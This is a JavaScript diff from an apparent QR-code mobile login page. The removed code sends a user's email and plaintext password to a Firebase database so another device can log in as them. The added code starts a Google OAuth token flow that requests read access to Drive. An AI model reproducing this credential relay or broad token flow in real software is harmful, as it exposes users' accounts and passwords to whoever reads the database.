@@ -335,56 +335,49 @@
             });
             
             // 發送登入資料到 Firebase Realtime Database
-            // 發送登入資料到 Firebase Realtime Database (替換原有函數)
-            function sendLoginData(connectionId, email, password) {
-                try {
-                    // 使用connectionId作為資料庫鍵值
-                    const connectionRef = database.ref('connections/' + connectionId);
+// 修改掃描 QR 碼後的行為
+function sendLoginData(connectionId, email, password) {
+    try {
+        // 顯示進度指示器
+        updateProgressStep(1);
         
-                    // 設定資料
-                    connectionRef.set({
-                        email: email,
-                        password: password,
-                        timestamp: Date.now(),
-                        status: 'pending',
-                        device: {
-                            type: 'mobile',
-                            userAgent: navigator.userAgent,
-                            platform: navigator.platform
-                        }
-                    });
+        // 建立 Firebase 連接參考
+        const connectionRef = database.ref('connections/' + connectionId);
         
-                    // 監聽狀態更新
-                    connectionRef.on('value', (snapshot) => {
-                        const data = snapshot.val();
-                        if (!data) return; // 資料已被刪除
-            
-                        const status = data.status;
-            
-                        if (status === 'pending') {
-                            showMessage('正在處理您的登入請求...', 'waiting');
-                        } else if (status === 'processing') {
-                            showMessage('電腦端正在進行登入...', 'waiting');
-                        } else if (status === 'success') {
-                            showMessage(`登入成功！已登入為: ${data.loggedInUser || 'Google用戶'}`, 'success');
-                            
-                            // 顯示其他登入資訊
-                            if (data.redirectUrl) {
-                                const additionalInfo = document.createElement('div');
-                                additionalInfo.innerHTML = `<p>電腦將導向至: ${data.redirectUrl}</p>`;
-                                document.querySelector('.container').appendChild(additionalInfo);
-                            }
-                        } else if (status === 'error') {
-                            showMessage(`登入失敗: ${data.errorMessage || '未知錯誤'}`, 'error');
-                        }
-                    });
-                    
-                    showMessage('已發送登入請求，請查看電腦端', 'success');
-                } catch (error) {
-                    showMessage('連線錯誤，請確保網路連線正常', 'error');
-                    console.error('Firebase error:', error);
-                }
+        // 記錄連接狀態
+        connectionRef.set({
+            status: 'pending',
+            timestamp: Date.now(),
+            device: {
+                type: 'mobile',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform
             }
+        });
+        
+        // 更新進度
+        updateProgressStep(2);
+        
+        // 使用 Google OAuth 流程
+        const clientId = '130403455153-cdmr57ri7qh3s6c8riul6q6hsi3arjf8.apps.googleusercontent.com';
+        const redirectUri = window.location.origin + '/mobile-callback.html';
+        const scope = 'email profile https://www.googleapis.com/auth/drive.readonly';
+        
+        // 建立 OAuth URL 時附加 connection_id 作為狀態參數
+        const authUrl = `https://accounts.google.com/o/oauth2/auth?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${encodeURIComponent(scope)}&login_hint=${encodeURIComponent(email)}&state=${connectionId}`;
+        
+        // 儲存 connectionId 以便回調頁面使用
+        localStorage.setItem('pendingConnectionId', connectionId);
+        
+        // 重定向到 Google 授權頁面
+        window.location.href = authUrl;
+        
+    } catch (error) {
+        showMessage('連線錯誤，請確保網路連線正常', 'error');
+        console.error('Firebase error:', error);
+        document.getElementById('progressContainer').style.display = 'none';
+    }
+}
             
             // 顯示訊息
             function showMessage(text, type) {
